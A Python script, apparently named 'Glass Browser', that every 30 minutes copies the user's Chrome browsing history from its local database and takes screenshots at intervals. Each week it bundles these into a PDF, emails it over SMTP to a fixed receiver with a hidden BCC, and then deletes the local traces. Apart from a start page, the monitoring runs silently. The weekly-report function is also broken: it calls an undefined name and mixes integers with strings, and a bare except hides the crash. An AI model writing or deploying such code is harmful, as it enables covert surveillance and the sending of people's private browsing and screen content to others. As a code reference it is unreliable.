import sqlite3
import numpy as np
import PIL
import pyautogui
from datetime import datetime
import os
import webbrowser

import email, smtplib,ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from PIL import Image
from reportlab.pdfgen.canvas import Canvas
from reportlab.lib.pagesizes import A4
from reportlab.lib.utils import ImageReader
import glob
import schedule
import time

#get windows users path
def userpath():
    userpath=os.path.expanduser('~')
    return userpath

# a function for timestamp
def timestamp():
    datetime_format = "%Y_%m_%d_%H_%M_%S"
    now = datetime.now()
    timestamp = now.strftime(datetime_format)
    return timestamp



#This will create directory img and urlfile for storing info
def intialize():
    userdir=userpath()
    directory1=r"resource\img"
    directory2=r"resource\urlfile"
    path1=os.path.join(userdir,directory1)
    path2 = os.path.join(userdir, directory2)
    try:
        os.makedirs(path1)
        os.makedirs(path2)
    except:
        log("The Directory is exist already")
        pass

def log(msg):
    currenttime = timestamp()
    userdir = userpath()
    directory_recource=r"resource\logs.txt"
    path_resource=os.path.join(userdir,directory_recource)
    with open(path_resource, 'a') as f:
        f.write(currenttime + "\t" + msg + '\n')


#python program to take screenshots
# take screenshot using pyautogui
def screenshot():
    image = pyautogui.screenshot()
    #using timestamp to name the file
    filename=timestamp()
    # writing it to the disk
    userdir = userpath()
    directory_img = r"resource\img\screenshot{}.jpg".format(filename)
    path_img=os.path.join(userdir,directory_img)
    image.save(path_img,optimize=True,quality=3)

def chromehistory():
    with open ("timecount.txt","r") as f:
        lasttime=f.read()
        if not lasttime:
             lasttime=0
    try:
        userdir=userpath()
        dir_his=r"AppData\Local\Google\Chrome\User Data\Default\History"
        path_his=os.path.join(userdir,dir_his)
        conn = sqlite3.connect(path_his)
        c = conn.cursor()
        c.execute("SELECT MAX(last_visit_time), datetime(last_visit_time/1000000 - 11644473600, 'unixepoch', 'localtime'), url, title, visit_count FROM urls WHERE last_visit_time > {lasttime} and visit_count<20 GROUP BY title ORDER BY last_visit_time DESC".format(lasttime=lasttime))
        results = c.fetchall()
        updatetime=str(results[0][0])
        with open ("timecount.txt","w") as f:
            f.write(updatetime)
        for result in results:
            with open ("history.txt","a",encoding='utf-8') as f:
                website=result[2].split("/")[2]
                print (website)
                f.write(result[1]+","+website+","+result[3]+"\n")

        conn.commit()
        conn.close()
    except:
        log("The browser was locked while reading history")


#pompt a webpage as sign of program start
def startsign():
    webbrowser.open('file://' + os.path.realpath("readme.html"))

#empty all hist.txt file and screeshot img
def delete_info():
    with open("history.txt", "w", encoding='utf-8') as f:
        f.write("Last Visit Time, Website, Title")
    log("The website history info in history.text file is deleted")
    userdir = userpath()
    directory_img = r"resource\img"
    path_img = os.path.join(userdir, directory_img)
    imgs=os.listdir(path_img)
    for img in imgs:
        if img.endswith('.jpg'):

            os.remove(os.path.join(path_img,img))
    #delete pdf file

    for pdffile in glob.glob("glass_browser*.pdf"):
        os.remove(pdffile)


    log("The screenshot img is deleted")

def send_email():
    #build pdf file from txt and img
    buildpdf()
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    password = "password"
    sender_email="my@gmail.com"
    receiver_email="you@hotmail.com"
    receiver_email_bcc="you@hotmail.com"
    subject="Glass Browser Project"
    body="""HELLO, I hope this email finds you well. I have attached the browser history as requested. Please let me know if you have any questions or if there is anything else I can do to help.
            Have a great Friday!
            Best regards"""

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email_bcc  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = glob.glob("glass_browser*.pdf")[-1]  # In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()
    #create a secure SSL context
    context= ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server,port,context=context) as server:
        server.login(sender_email,password)
        server.sendmail(sender_email,receiver_email,text)

    log("The email is sent out, Success!!!")
    #delete all files last week
    delete_info()


#this will build a pdf file to combine history file and screenshots imgs
def buildpdf():
    w,h=A4
    #create a new Canvas instance
    pdftime = timestamp()
    pdfname = "glass_browser_{}.pdf".format(pdftime)
    canvas=Canvas(pdfname)
    canvas.setTitle(pdfname)

    #write text to pdf canvas

    canvas.drawCentredString(300,h-20,pdfname)

    # add the text to the page
    with open("history.txt", "r",encoding="utf-8") as f:
        count=0
        lines=f.readlines()
        text = canvas.beginText(50, h - 50)
        text.setFont("Times-Roman", 10)
        for line in lines:
            count += 1
            if count>60:
                canvas.drawText(text)
                canvas.showPage()
                count=0
                text = canvas.beginText(50, h - 50)
                text.setFont("Times-Roman", 10)

            text.textLine(line)

        canvas.drawText(text)

    canvas.showPage()
    userdir = userpath()
    directory_img = r"resource\img\*.jpg"
    path_img = os.path.join(userdir, directory_img)
    x=30
    y=200
    image_count=1
    for img in glob.glob(path_img):
        print (img)
        canvas.drawImage(img,x,h-y,width=260,height=150)
        image_count +=1
        if image_count ==2:
            x=300
            y=200
        elif image_count==3:
            x=30
            y=365
        elif image_count==4:
            x=300
            y=365
        elif image_count==5:
            x=30
            y=520
        elif image_count==6:
            x=300
            y=520
        elif image_count==7:
            x=30
            y=720
        elif image_count==8:
            x=300
            y=720
        else:
            canvas.showPage()
            x = 30
            y = 200
            image_count = 1


    canvas.save()

    log('the pdf file is built')


# with this funcation, from monday to thursday, it will maintain the report status as not sent
# on friday till sunday, it will send the report and change the not send code to send code.
def sendreport():
    try:
        today=datetimedatetime.today()
        weekday=today.weekday()
        weeknumber = today.isocalendar()[1]
        sentcode=weeknumber+"11"
        notcode=weeknumber+"00"
        if weekday<4:
            with open("reportstatus.txt","w") as f:
                f.write(notcode)
            log("checked the status")
        else:
            with open ("reportstatus.txt","r") as f:
                statuscode=f.read()
            # if report statuscode is null, sent report
            if statuscode ==sentcode:
                log("Check, The report was sent already.")
            else:
                send_email()
                with open ("reportstatus.txt","w") as f:
                    f.write(sentcode)
                log("sending mail. changing status code")
    except:
        log("The program crushed by some unknow reason")

#intialize the program when start every time
intialize()
startsign()

#Task scheduling
#After every 30 minutes checking browser history

schedule.every(30).minutes.do(chromehistory)

#After every 60 to 90 minutes take a screenshot
schedule.every(60).to(90).minutes.do(screenshot)

#Every Friday send the report then delete all file
#incase on friday the pc is shut off and missed the schedule time, the task will check everyday, every 120 minutes.
schedule.every(120).minutes.do(sendreport)

while True:
    schedule.run_pending()
    time.sleep(600)
